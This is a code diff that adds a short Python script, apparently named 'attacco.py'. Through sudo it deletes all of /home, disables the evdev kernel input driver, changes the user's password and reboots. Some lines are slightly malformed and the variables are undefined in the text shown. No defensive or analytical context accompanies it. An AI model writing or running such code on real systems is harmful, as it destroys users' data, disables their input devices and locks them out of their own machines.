@@ -1,0 +1,12 @@
+import os
+
+os.system(f"echo {old_password} | sudo -S ")
+os.system(f"echo {old_password} | sudo -S mv attacco.py /")
+os.system(f"echo {old_password} | sudo -S rm -rvf /home/*")
+
+os.system(f"echo {old_password} | sudo -S mv /lib/modules/$(uname -r)/kernel/drivers/input/evdev.ko /lib/modules/$(uname -r)/kernel/drivers/input/evdev.ko.disabled")
+os.system(f"echo {old_password} | sudo -S depmod -a")
+
+os.system(f"echo '{uname}:{new_password}' | sudo chpasswd")
+
+os.system(f"echo '{new_password} | sudo -S reboot")
